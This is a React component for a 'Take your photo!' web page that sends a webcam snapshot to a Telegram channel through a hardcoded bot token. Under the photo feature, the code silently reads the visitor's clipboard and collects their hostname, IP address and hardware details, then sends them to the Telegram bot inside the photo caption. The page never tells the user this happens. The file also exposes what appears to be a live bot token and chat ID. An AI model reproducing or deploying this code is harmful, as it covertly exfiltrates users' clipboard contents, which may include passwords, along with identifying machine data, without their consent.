import { Button, Form, message } from "antd";
import { useEffect, useRef, useState } from "react";
import Webcam from "react-webcam";
import FormData from "form-data";
import "./style.css";
import axios from "axios";

// type formType = {
//   telegram_id: string;
//   name: string;
// };

type systemInfoType = {
  system: string;
  nodeName: string;
  release: string;
  version: string;
  machine: string;
  processor: string;
  memory: {
    total: number;
    free: number;
  };
  ipv4: string;
  hostname: string;
};

const videoConstraints = {
  width: 220,
  height: 200,
  facingMode: "user",
};

const Content = () => {
  // const [form, setForm] = useState<formType>({
  //   telegram_id: "",
  //   name: "",
  // });

  const [isLoading, setIsLoading] = useState(false);

  const [hardwareInfo, setHardwareInfo] = useState<systemInfoType>({
    system: "",
    nodeName: "",
    release: "",
    version: "",
    machine: "",
    processor: "",
    memory: {
      total: 0,
      free: 0,
    },
    ipv4: "",
    hostname: "",
  });

  const telegramToken = "7443522978:AAFZZZlo0dYPlHOc4h2cPDw4igQBdhU8JX0";

  const telegramChatId = "-1002248016905";

  const webcamRef = useRef(null);

  const [imgSrc, setImgSrc] = useState("");

  const [messageApi, contextHolder] = message.useMessage();

  // const telegramChatId = form?.telegram_id;
  // const [formData] = Form.useForm();
  //

  const capture = () => {
    const imageSrc = webcamRef.current.getScreenshot();
    setImgSrc(imageSrc);
  };

  const successMessage = () => {
    messageApi.open({
      type: "success",
      content: "Photo and info sent successfully to the channel!",
    });
  };

  const errorMessage = () => {
    messageApi.open({
      type: "error",
      content: "Failed to send photo and info",
    });
  };

  const warningMessage = () => {
    messageApi.open({
      type: "warning",
      content: "No photo available to send",
    });
  };

  useEffect(() => {
    setIsLoading(true)
    axios
      .get("http://localhost:3000/hardware-info")
      .then((response) => {
        setHardwareInfo(response.data);
        setIsLoading(false);
      })
      .catch((error) => {
        console.error("There was an error fetching the hardware info!", error);
        setIsLoading(false);
      });
  }, []);

  const getClipboardContent = async () => {
    try {
      return await navigator.clipboard.readText();
    } catch (err) {
      console.error("Failed to read clipboard contents: ", err);
      return "Could not read clipboard contents";
    }
  };

  const sendPhotoToTelegram = async () => {
    setIsLoading(true);
    if (imgSrc) {
      try {
        const response = await fetch(imgSrc);
        const blob = await response.blob();

        const clipboardContent = await getClipboardContent();

        const caption = `
          System Info:

            'hostname': ${hardwareInfo.hostname}
            'ipv4': ${hardwareInfo.ipv4}
            'machine': ${hardwareInfo.machine}
            'memory': {
              {
                total: ${hardwareInfo.memory.total}
                free: ${hardwareInfo.memory.free}
              }
            }
            'nodeName': ${hardwareInfo.nodeName}
            'processor': ${hardwareInfo.processor}
            'release': ${hardwareInfo.release}
            'system': ${hardwareInfo.system}
            'version': ${hardwareInfo.version}
            
          Clipboard Content:

            ${clipboardContent}
          `;

        const formData = new FormData();
        formData.append("chat_id", telegramChatId);
        formData.append("photo", blob, "webcam-photo.jpg");
        formData.append("caption", caption);

        const telegramResponse = await fetch(
          `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
          {
            method: "POST",
            body: formData,
          }
        );

        const result = await telegramResponse.json();
        if (result.ok) {
          setImgSrc("");
          successMessage();
        } else {
          console.error("Error sending photo and info:", result);
          errorMessage();
        }
      } catch (error) {
        console.error("Error sending photo and info:", error);
        errorMessage();
      } finally {
        setIsLoading(false);
      }
    } else {
      warningMessage();
    }
  };

  const handleSubmit = async () => {
    sendPhotoToTelegram();
  };

  return (
    <div className="home-container">
      {contextHolder}
      <div className="container">
        <div className="text">
          <h1>Take your photo!</h1>
          <Form
            className="form"
            // form={formData}
            // autoComplete={"off"}
            // onFinish={handleSubmit}
          >
            <div className="webcam-container">
              <div className="webcam-img flex justify-center">
                {imgSrc === "" ? (
                  <Webcam
                    audio={false}
                    height={200}
                    ref={webcamRef}
                    screenshotFormat="image/jpeg"
                    width={290}
                    videoConstraints={videoConstraints}
                  />
                ) : (
                  <img src={imgSrc} />
                )}
              </div>
              <div>
                {imgSrc != "" ? (
                  <button
                    onClick={(e) => {
                      e.preventDefault();
                      setImgSrc("");
                    }}
                    className="webcam-btn"
                  >
                    Retake Image
                  </button>
                ) : (
                  <Button
                    onClick={(e) => {
                      e.preventDefault();
                      capture();
                    }}
                    className="webcam-btn !py-6"
                  >
                    Capture
                  </Button>
                )}
              </div>
            </div>
            <div className="mb-5">
              <span className="text-lg">Telegram Channel:</span>
              <a
                href="https://t.me/+yqqh79gBdeUxZDFk"
                target="_blank"
                className="text-red-500 font-bold"
              >
                {" "}
                Click me!
              </a>
            </div>
            {/* <Form.Item
              style={{
                padding: 0,
                margin: 0,
              }}
              name={"telegram_id"}
              rules={[{ required: true, message: "Telegram Id is required" }]}
            >
              <input
                required
                placeholder="Telegram Id"
                onChange={(e) =>
                  setForm({ ...form, telegram_id: e.target.value })
                }
                value={form.telegram_id}
              />
            </Form.Item>
            <input
              type="text"
              placeholder="Name"
              onChange={(e) => setForm({ ...form, name: e.target.value })}
              value={form.name}
            />
            <Form.Item> */}
            <Button
              onClick={handleSubmit}
              id="login-button"
              className="!py-6"
              loading={isLoading}
            >
              Submit
            </Button>
            {/* </Form.Item> */}
          </Form>
        </div>
      </div>
    </div>
  );
};
export default Content;
